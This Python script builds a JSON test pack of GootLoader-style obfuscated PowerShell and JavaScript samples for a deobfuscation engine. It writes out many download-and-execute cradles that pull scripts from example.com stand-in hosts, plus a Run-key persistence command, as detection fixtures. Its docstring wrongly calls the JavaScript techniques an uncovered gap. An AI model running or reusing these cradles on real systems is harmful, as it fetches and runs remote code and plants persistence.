"""
Phase R1 · GootLoader family sample builder (technique-first schema).

GootLoader (Gootkit initial-access loader, tracked as UNC2565/UNC2900)
delivers PowerShell payloads via SEO-poisoned JavaScript on
compromised WordPress sites. The JavaScript initial stage is heavy
with unicode-escape and multi-line string obfuscation and eventually
hands off to PowerShell using techniques that the Convergence Engine
handles today:

* env-var slicing to reconstruct `powershell` invocations
* IEX + DownloadString / IWR download cradles
* multi-variable single-quoted string reconstruction
* -EncodedCommand base64 + UTF-16LE stagers
* CMD caret \u2192 PowerShell handoff

Scope of this pack
------------------
This pack covers the **PowerShell-side techniques** that GootLoader
uses once the JavaScript decoder has emitted its next-stage command
line. The JavaScript-side unicode/atob/split reconstruction is
tracked as an **explicit coverage gap** in
``known_technique_universe`` \u2014 the technique id is declared but
carries zero samples until the engine gains JS decoders. This is the
"honest coverage" principle: gaps are surfaced, not silently omitted.
"""
from __future__ import annotations

import base64
import json
from pathlib import Path

FAMILIES_DIR = Path(__file__).resolve().parent / "families"
TARGET = FAMILIES_DIR / "gootloader.json"


def _b64_utf16le(s: str) -> str:
    return base64.b64encode(s.encode("utf-16le")).decode("ascii")


def _hex_b64_utf16le(s: str) -> str:
    return base64.b64encode(s.encode("utf-16le")).decode("ascii").encode("ascii").hex()


CRADLE_IEX = "IEX ((New-Object Net.WebClient).DownloadString('{url}'))"


def _sample(
    sid: str,
    variant: str,
    input_str: str,
    interpreter: str | None,
    final_interpreter: str,
    decoder_chain: list[str],
    final_output_contains: list[str],
    iocs_contains: list[str],
    mitre_attack: list[str],
    behaviors: list[str],
) -> dict:
    return {
        "id": sid,
        "variant": variant,
        "input": input_str,
        "expected": {
            "interpreter": interpreter,
            "final_interpreter": final_interpreter,
            "decoder_chain": decoder_chain,
            "final_output_contains": final_output_contains,
            "iocs_contains": iocs_contains,
            "mitre_attack": mitre_attack,
            "behaviors": behaviors,
        },
    }


TECHNIQUES: list[dict] = [
    # ------------------------------------------------------------------
    {
        "id": "powershell_iex_download_cradle",
        "display_name": "PowerShell IEX DownloadString Cradle",
        "description": (
            "GootLoader's second-stage `IEX ((New-Object Net.WebClient)."
            "DownloadString($url))` pattern, delivering next-stage script"
            " from a compromised WordPress domain."
        ),
        "mitre_attack": ["T1059.001", "T1105"],
        "samples": [
            _sample(
                "GL001", "iex_downloadstring_wordpress_next_stage",
                'IEX ((New-Object Net.WebClient).DownloadString("http://compromised-wp.example.com/wp-content/uploads/next.ps1"))',
                "powershell", "powershell",
                ["alias-expand"],
                ["Invoke-Expression", "compromised-wp.example.com/wp-content/uploads/next.ps1"],
                ["http://compromised-wp.example.com/wp-content/uploads/next.ps1"],
                ["T1059.001", "T1105"],
                ["download_and_execute", "seo_poisoning_delivery"],
            ),
            _sample(
                "GL002", "iex_downloadstring_lowercase_wp",
                'iex ((new-object net.webclient).downloadstring("http://wp-victim.example.org/wp-content/themes/gl_stage2"))',
                "powershell", "powershell",
                ["alias-expand"],
                ["Invoke-Expression", "wp-victim.example.org/wp-content/themes/gl_stage2"],
                ["http://wp-victim.example.org/wp-content/themes/gl_stage2"],
                ["T1059.001", "T1105"],
                ["download_and_execute", "seo_poisoning_delivery"],
            ),
            _sample(
                "GL003", "iex_downloadstring_https_gootloader_dropper",
                "IEX ((New-Object Net.WebClient).DownloadString('https://gl-stage.example.net/dropper.ps1'))",
                "powershell", "powershell",
                ["alias-expand"],
                ["Invoke-Expression", "https://gl-stage.example.net/dropper.ps1"],
                ["https://gl-stage.example.net/dropper.ps1"],
                ["T1059.001", "T1105"],
                ["download_and_execute"],
            ),
        ],
    },
    # ------------------------------------------------------------------
    {
        "id": "powershell_iwr_useb_iex_pipeline",
        "display_name": "PowerShell IWR + UseBasicParsing | IEX",
        "description": (
            "`iwr $url -useb | iex` fetch-and-execute pipeline (GootLoader"
            " Stage-3 pattern; used for both PowerShell and Cobalt Strike"
            " payload delivery)."
        ),
        "mitre_attack": ["T1059.001", "T1105"],
        "samples": [
            _sample(
                "GL004", "iwr_useb_iex_wp_stage3",
                "iwr 'http://gl-cdn.example.com/wp/stage3.txt' -UseBasicParsing | iex",
                "powershell", "powershell",
                ["alias-expand"],
                ["Invoke-WebRequest", "http://gl-cdn.example.com/wp/stage3.txt", "Invoke-Expression"],
                ["http://gl-cdn.example.com/wp/stage3.txt"],
                ["T1059.001", "T1105"],
                ["download_and_execute"],
            ),
            _sample(
                "GL005", "iwr_useb_iex_https",
                "iwr https://gl-victim.example.net/wp-content/plugins/gl4.ps1 -useb | iex",
                "powershell", "powershell",
                ["alias-expand"],
                ["Invoke-WebRequest", "https://gl-victim.example.net/wp-content/plugins/gl4.ps1", "Invoke-Expression"],
                ["https://gl-victim.example.net/wp-content/plugins/gl4.ps1"],
                ["T1059.001", "T1105"],
                ["download_and_execute"],
            ),
        ],
    },
    # ------------------------------------------------------------------
    {
        "id": "powershell_variable_reconstruction",
        "display_name": "PowerShell Variable Reconstruction",
        "description": (
            "GootLoader authors split the URL and cmdlet arguments across"
            " multiple single-quoted variables, then concat them into the"
            " final invocation. Requires string-concat-fold and"
            " variable-propagate together."
        ),
        "mitre_attack": ["T1059.001", "T1105", "T1027.010"],
        "samples": [
            _sample(
                "GL006", "three_var_url_reconstruct",
                "$a='ht'; $b='tp://'; $c='gl-recon.example.com/dropper.ps1'; iex ((new-object net.webclient).downloadstring($a+$b+$c))",
                "powershell", "powershell",
                ["variable-propagate", "string-concat-fold", "alias-expand"],
                ["Invoke-Expression", "http://gl-recon.example.com/dropper.ps1"],
                ["http://gl-recon.example.com/dropper.ps1"],
                ["T1059.001", "T1105", "T1027.010"],
                ["download_and_execute", "obfuscated_command_line"],
            ),
            _sample(
                "GL007", "four_var_url_reconstruct_https",
                "$s='ht'+'tps'; $d='://gl-4v.example.org'; $p='/wp-content'; $f='/gl_stage.ps1'; iex ((new-object net.webclient).downloadstring($s+$d+$p+$f))",
                "powershell", "powershell",
                ["variable-propagate", "string-concat-fold", "alias-expand"],
                ["Invoke-Expression", "https://gl-4v.example.org/wp-content/gl_stage.ps1"],
                ["https://gl-4v.example.org/wp-content/gl_stage.ps1"],
                ["T1059.001", "T1105", "T1027.010"],
                ["download_and_execute", "obfuscated_command_line"],
            ),
            _sample(
                "GL008", "single_var_full_url",
                "$u='http://gl-1v.example.com/gl_final.ps1'; iex ((new-object net.webclient).downloadstring($u))",
                "powershell", "powershell",
                ["variable-propagate", "alias-expand"],
                ["Invoke-Expression", "http://gl-1v.example.com/gl_final.ps1"],
                ["http://gl-1v.example.com/gl_final.ps1"],
                ["T1059.001", "T1105"],
                ["download_and_execute"],
            ),
        ],
    },
    # ------------------------------------------------------------------
    {
        "id": "powershell_string_concat_obfuscation",
        "display_name": "PowerShell String-Concat URL Obfuscation",
        "description": (
            "URL literal reconstructed at the call site with 2-4 SQ concat"
            " fragments \u2014 no intermediate variables."
        ),
        "mitre_attack": ["T1059.001", "T1105", "T1027.010"],
        "samples": [
            _sample(
                "GL009", "inline_concat_2part",
                "iex ((new-object net.webclient).downloadstring('http://gl-cat.example.com/'+'gl_a.ps1'))",
                "powershell", "powershell",
                ["string-concat-fold", "alias-expand"],
                ["Invoke-Expression", "http://gl-cat.example.com/gl_a.ps1"],
                ["http://gl-cat.example.com/gl_a.ps1"],
                ["T1059.001", "T1105", "T1027.010"],
                ["download_and_execute", "obfuscated_command_line"],
            ),
            _sample(
                "GL010", "inline_concat_4part",
                "iex ((new-object net.webclient).downloadstring('ht'+'tp'+'://gl-cat.example.org/'+'gl_b.ps1'))",
                "powershell", "powershell",
                ["string-concat-fold", "alias-expand"],
                ["Invoke-Expression", "http://gl-cat.example.org/gl_b.ps1"],
                ["http://gl-cat.example.org/gl_b.ps1"],
                ["T1059.001", "T1105", "T1027.010"],
                ["download_and_execute", "obfuscated_command_line"],
            ),
        ],
    },
    # ------------------------------------------------------------------
    {
        "id": "powershell_encodedcommand_base64_utf16le",
        "display_name": "PowerShell -EncodedCommand (Base64/UTF-16LE)",
        "description": (
            "Base64-encoded UTF-16LE next-stage script delivered via"
            " `-EncodedCommand` / `-Enc` / `-enc` (GootLoader final-stage"
            " PowerShell handoff)."
        ),
        "mitre_attack": ["T1059.001", "T1027", "T1140"],
        "samples": [
            _sample(
                "GL011", "encodedcommand_iex_cradle",
                "powershell -EncodedCommand " + _b64_utf16le(CRADLE_IEX.format(url="http://gl-enc.example.com/stage_iex.ps1")),
                "powershell", "powershell",
                ["powershell-encoded-command", "base64", "utf-16le-decode", "alias-expand"],
                ["Invoke-Expression", "http://gl-enc.example.com/stage_iex.ps1"],
                ["http://gl-enc.example.com/stage_iex.ps1"],
                ["T1059.001", "T1105", "T1027", "T1140"],
                ["download_and_execute", "obfuscated_command_line"],
            ),
            _sample(
                "GL012", "encodedcommand_hidden_window",
                "powershell -NoP -NonI -W Hidden -Enc "
                + _b64_utf16le(CRADLE_IEX.format(url="http://gl-hidden.example.org/gl_h.ps1")),
                "powershell", "powershell",
                ["powershell-encoded-command", "base64", "utf-16le-decode", "alias-expand"],
                ["Invoke-Expression", "http://gl-hidden.example.org/gl_h.ps1"],
                ["http://gl-hidden.example.org/gl_h.ps1"],
                ["T1059.001", "T1105", "T1027", "T1564.003"],
                ["download_and_execute", "hidden_window", "obfuscated_command_line"],
            ),
            _sample(
                "GL013", "encodedcommand_writehost_beacon_check",
                "powershell -Enc "
                + _b64_utf16le('Write-Host "GootLoader beacon check-in"'),
                "powershell", "powershell",
                ["powershell-encoded-command", "base64", "utf-16le-decode"],
                ["Write-Host", "GootLoader beacon check-in"],
                [],
                ["T1059.001", "T1027"],
                ["obfuscated_command_line", "beacon_checkin"],
            ),
            _sample(
                "GL014", "encodedcommand_registry_persistence",
                "powershell -Enc "
                + _b64_utf16le(
                    'Set-ItemProperty -Path "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" -Name GLPersist -Value "powershell -w hidden -c IEX ((New-Object Net.WebClient).DownloadString(\'http://gl-persist.example.com/gl.ps1\'))"'
                ),
                "powershell", "powershell",
                ["powershell-encoded-command", "base64", "utf-16le-decode"],
                ["Set-ItemProperty", "CurrentVersion\\Run", "GLPersist", "http://gl-persist.example.com/gl.ps1"],
                ["http://gl-persist.example.com/gl.ps1"],
                ["T1059.001", "T1027", "T1547.001", "T1105"],
                ["registry_run_key_persistence", "download_and_execute", "obfuscated_command_line"],
            ),
        ],
    },
    # ------------------------------------------------------------------
    {
        "id": "powershell_env_var_slicing",
        "display_name": "PowerShell Environment-Variable Slicing",
        "description": (
            "Cmdlet names and switches reconstructed at runtime from"
            " `$env:ComSpec[..]`, `$env:PATH[..]`, `$env:Public[..]`"
            " indexes. Requires env-substitute + string-index-fold +"
            " structural-fold."
        ),
        "mitre_attack": ["T1059.001", "T1027.010", "T1140"],
        "samples": [
            _sample(
                "GL015", "env_slice_reconstruct_ps_command",
                "& ( $enV:CoMsPeC-jOiN'') ( ( [sTrInG]::JoIn( '', ( $enV:pAtH[4..6] + $EnV:pUbLiC[12] + $EnV:pRoGrAmFiLeS[9] + $enV:CoMsPeC[4,15,25] ) ) -jOiN '' ) + \" -cOmmAnD IEX ((New-Object Net.WebClient).DownloadString('http://gl-env.example.com/env_stage.ps1'))\" )",
                "powershell", "powershell",
                ["env-substitute", "string-index-fold", "structural-fold"],
                ["gl-env.example.com/env_stage.ps1", "DownloadString"],
                ["http://gl-env.example.com/env_stage.ps1"],
                ["T1059.001", "T1105", "T1027.010", "T1140"],
                ["env_var_slicing", "download_and_execute", "obfuscated_command_line"],
            ),
            _sample(
                "GL016", "env_slice_writehost_stager",
                "& ( $enV:CoMsPeC-jOiN'') ( ( [sTrInG]::JoIn( '', ( $enV:pAtH[4..6] + $EnV:pUbLiC[12] + $EnV:pRoGrAmFiLeS[9] + $enV:CoMsPeC[4,15,25] ) ) -jOiN '' ) + \" -cOmmAnD Write-Host 'GootLoader env slice reached'\" )",
                "powershell", "powershell",
                ["env-substitute", "string-index-fold", "structural-fold"],
                ["Write-Host", "GootLoader env slice reached"],
                [],
                ["T1059.001", "T1027.010", "T1140"],
                ["env_var_slicing", "obfuscated_command_line"],
            ),
        ],
    },
    # ------------------------------------------------------------------
    {
        "id": "powershell_backtick_obfuscation",
        "display_name": "PowerShell Backtick Alias Obfuscation",
        "description": (
            "GootLoader injects backtick escapes mid-identifier to break"
            " signature-based EDR (e.g. `I`E`X`, `i`w`r`, `i`e`x`)."
        ),
        "mitre_attack": ["T1059.001", "T1027.010"],
        "samples": [
            _sample(
                "GL017", "backtick_iex_downloadstring",
                "I`E`X ((New-Object Net.WebClient).DownloadString('http://gl-bt.example.com/bt.ps1'))",
                "powershell", "powershell",
                ["backtick-strip", "alias-expand"],
                ["Invoke-Expression", "http://gl-bt.example.com/bt.ps1"],
                ["http://gl-bt.example.com/bt.ps1"],
                ["T1059.001", "T1105", "T1027.010"],
                ["backtick_obfuscation", "download_and_execute"],
            ),
            _sample(
                "GL018", "backtick_iwr_useb_iex",
                "i`wr 'https://gl-bt2.example.org/bt2.ps1' -useb | i`ex",
                "powershell", "powershell",
                ["backtick-strip", "alias-expand"],
                ["Invoke-WebRequest", "https://gl-bt2.example.org/bt2.ps1", "Invoke-Expression"],
                ["https://gl-bt2.example.org/bt2.ps1"],
                ["T1059.001", "T1105", "T1027.010"],
                ["backtick_obfuscation", "download_and_execute"],
            ),
        ],
    },
    # ------------------------------------------------------------------
    {
        "id": "powershell_case_obfuscation",
        "display_name": "PowerShell Random-Case Obfuscation",
        "description": (
            "GootLoader randomizes cmdlet and alias casing to break"
            " string-match detections."
        ),
        "mitre_attack": ["T1059.001", "T1027.010"],
        "samples": [
            _sample(
                "GL019", "random_case_iex_downloadstring",
                "iEx ((nEw-oBjecT nEt.WebClIent).DoWnLoAdStrIng('http://gl-cs.example.com/cs.ps1'))",
                "powershell", "powershell",
                ["alias-expand"],
                ["Invoke-Expression", "http://gl-cs.example.com/cs.ps1"],
                ["http://gl-cs.example.com/cs.ps1"],
                ["T1059.001", "T1105", "T1027.010"],
                ["case_obfuscation", "download_and_execute"],
            ),
            _sample(
                "GL020", "random_case_iwr_iex_pipeline",
                "IwR 'http://gl-cs2.example.org/cs2.ps1' -uSeB | iEx",
                "powershell", "powershell",
                ["alias-expand"],
                ["Invoke-WebRequest", "http://gl-cs2.example.org/cs2.ps1", "Invoke-Expression"],
                ["http://gl-cs2.example.org/cs2.ps1"],
                ["T1059.001", "T1105", "T1027.010"],
                ["case_obfuscation", "download_and_execute"],
            ),
        ],
    },
    # ------------------------------------------------------------------
    {
        "id": "cmd_caret_powershell_handoff",
        "display_name": "CMD Caret \u2192 PowerShell Handoff",
        "description": (
            "wscript.exe / cscript.exe launches cmd.exe with caret-escaped"
            " arguments, which shells out to powershell.exe with an"
            " -EncodedCommand base64 payload. Rare in GootLoader main"
            " chain but observed in derivative loaders."
        ),
        "mitre_attack": ["T1059.001", "T1059.003", "T1105", "T1140"],
        "samples": [
            _sample(
                "GL021", "cmd_caret_ps_enc_gootloader_style",
                "c^m^d /c p^ow^ers^he^ll -e^nc "
                + _b64_utf16le(CRADLE_IEX.format(url="http://gl-caret.example.com/gl_caret.ps1")),
                "cmd", "powershell",
                ["cmd-caret-strip", "powershell-encoded-command", "base64", "utf-16le-decode", "alias-expand"],
                ["Invoke-Expression", "http://gl-caret.example.com/gl_caret.ps1"],
                ["http://gl-caret.example.com/gl_caret.ps1"],
                ["T1059.001", "T1059.003", "T1105", "T1027", "T1140"],
                ["cmd_to_ps_handoff", "download_and_execute", "obfuscated_command_line"],
            ),
        ],
    },
    # ------------------------------------------------------------------
    {
        "id": "nested_multi_layer_encoding",
        "display_name": "Nested Multi-Layer Encoding (Hex\u2192Base64\u2192UTF-16LE)",
        "description": (
            "GootLoader wraps its stager in three sequential encodings"
            " (raw hex over base64 over UTF-16LE) as a single blob"
            " emitted by the JavaScript downloader."
        ),
        "mitre_attack": ["T1027", "T1140", "T1059.001"],
        "samples": [
            _sample(
                "GL022", "hex_over_b64_over_utf16le",
                _hex_b64_utf16le(CRADLE_IEX.format(url="http://gl-hex.example.com/gl_hex.ps1")),
                None, "powershell",
                ["hex-decode", "base64", "utf-16le-decode", "alias-expand"],
                ["Invoke-Expression", "http://gl-hex.example.com/gl_hex.ps1"],
                ["http://gl-hex.example.com/gl_hex.ps1"],
                ["T1027", "T1105", "T1140", "T1059.001"],
                ["multi_layer_obfuscation", "download_and_execute"],
            ),
        ],
    },
    # ------------------------------------------------------------------
    {
        "id": "javascript_unicode_escape",
        "display_name": "JavaScript Unicode-Escape String Reconstruction",
        "description": (
            "GootLoader ships next-stage payload as a JavaScript string"
            " of `\\uXXXX\\uXXXX...` escape sequences. Once folded, the"
            " plaintext reveals the downstream PowerShell or JavaScript"
            " command."
        ),
        "mitre_attack": ["T1027", "T1140", "T1059.007"],
        "samples": [
            _sample(
                "GL023", "unicode_escape_reveals_iex_cradle",
                "var s = "
                + "'"
                + "".join(
                    "\\u%04x" % ord(c)
                    for c in "IEX ((New-Object Net.WebClient).DownloadString('http://gl-unicode.example.com/gl_u.ps1'))"
                ).replace("'", "\\u0027")
                + "';",
                "javascript", "javascript",
                ["js-unicode-escape"],
                ["IEX", "DownloadString", "gl-unicode.example.com/gl_u.ps1"],
                ["http://gl-unicode.example.com/gl_u.ps1"],
                ["T1027", "T1140", "T1059.007", "T1105"],
                ["javascript_to_powershell_handoff", "download_and_execute", "obfuscated_command_line"],
            ),
        ],
    },
    # ------------------------------------------------------------------
    {
        "id": "javascript_atob_chain",
        "display_name": "JavaScript atob() Base64 Chain",
        "description": (
            "GootLoader (and SocGholish / ClearFake / Pikabot / ChromeLoader)"
            " wraps stagers in `atob('B64')` or nested `atob(atob('B64B64'))`"
            " calls. The Convergence Engine peels each atob layer through"
            " successive iterations of the outer loop."
        ),
        "mitre_attack": ["T1027", "T1140", "T1059.007"],
        "samples": [
            _sample(
                "GL024", "single_atob_reveals_iex_cradle",
                "var payload = atob('"
                + base64.b64encode(
                    "IEX ((New-Object Net.WebClient).DownloadString('http://gl-atob.example.com/gl_a.ps1'))".encode("utf-8")
                ).decode("ascii")
                + "');",
                "javascript", "javascript",
                ["js-atob"],
                ["IEX", "DownloadString", "gl-atob.example.com/gl_a.ps1"],
                ["http://gl-atob.example.com/gl_a.ps1"],
                ["T1027", "T1140", "T1059.007", "T1105"],
                ["javascript_to_powershell_handoff", "download_and_execute", "obfuscated_command_line"],
            ),
        ],
    },
    # ------------------------------------------------------------------
    {
        "id": "javascript_string_split_shuffle",
        "display_name": "JavaScript .split().reverse().join() Shuffle",
        "description": (
            "GootLoader / SocGholish shuffle their stagers by reversing"
            " a delimited string:"
            " `'PAYLOAD_REVERSED'.split('').reverse().join('')` reveals"
            " the true command."
        ),
        "mitre_attack": ["T1027", "T1140", "T1059.007"],
        "samples": [
            _sample(
                "GL025", "split_reverse_join_reveals_iex_cradle",
                "var cmd = '"
                + 'IEX ((New-Object Net.WebClient).DownloadString("http://gl-srj.example.com/gl_s.ps1"))'[::-1]
                + "'.split('').reverse().join('');",
                "javascript", "javascript",
                ["js-split-reverse-join"],
                ["IEX", "DownloadString", "gl-srj.example.com/gl_s.ps1"],
                ["http://gl-srj.example.com/gl_s.ps1"],
                ["T1027", "T1140", "T1059.007", "T1105"],
                ["javascript_to_powershell_handoff", "download_and_execute", "obfuscated_command_line"],
            ),
        ],
    },
]


# ---------------------------------------------------------------------------
# Coverage gaps \u2014 declared as part of the known-technique universe so the
# Coverage Matrix surfaces them as un-covered rather than pretending they
# don't exist. Zero samples until the engine gains the necessary decoders.
# ---------------------------------------------------------------------------
COVERAGE_GAP_TECHNIQUES: list[str] = [
    # Nothing pending. Every JS technique previously listed as a gap is
    # now covered by the JavaScript decoder pass (v2.1).
]


def build() -> dict:
    known_universe = sorted(
        {t["id"] for t in TECHNIQUES} | set(COVERAGE_GAP_TECHNIQUES)
    )
    return {
        "family_id": "gootloader",
        "family_display_name": "GootLoader",
        "family_version": "r1-2.0.0",
        "schema_version": "technique-first-1.0.0",
        "description": (
            "GootLoader (UNC2565/UNC2900) SEO-poisoned JavaScript-to-PowerShell"
            " loader. This pack covers the deterministic PowerShell handoff"
            " techniques observed downstream of the JS decoder stage."
            " JavaScript-side unicode / atob / split-shuffle obfuscation is"
            " declared in the known-technique universe as an explicit coverage"
            " gap (zero samples) until the engine gains JS-native decoders."
        ),
        "primary_mitre_attack": [
            "T1059.001",
            "T1059.007",
            "T1105",
            "T1027.010",
            "T1140",
            "T1547.001",
            "T1608.001",
        ],
        "primary_behaviors": [
            "seo_poisoning_delivery",
            "javascript_to_powershell_handoff",
            "download_and_execute",
            "obfuscated_command_line",
            "registry_run_key_persistence",
        ],
        "known_technique_universe": known_universe,
        "coverage_gap_techniques": sorted(COVERAGE_GAP_TECHNIQUES),
        "techniques": TECHNIQUES,
    }


def main() -> int:
    FAMILIES_DIR.mkdir(parents=True, exist_ok=True)
    payload = build()
    TARGET.write_text(json.dumps(payload, indent=2) + "\n", encoding="utf-8")
    sample_count = sum(len(t["samples"]) for t in payload["techniques"])
    tech_count = len(payload["techniques"])
    gap_count = len(payload["coverage_gap_techniques"])
    print(
        f"Wrote {sample_count} GootLoader samples across {tech_count} techniques "
        f"({gap_count} declared coverage gaps) to {TARGET}"
    )
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
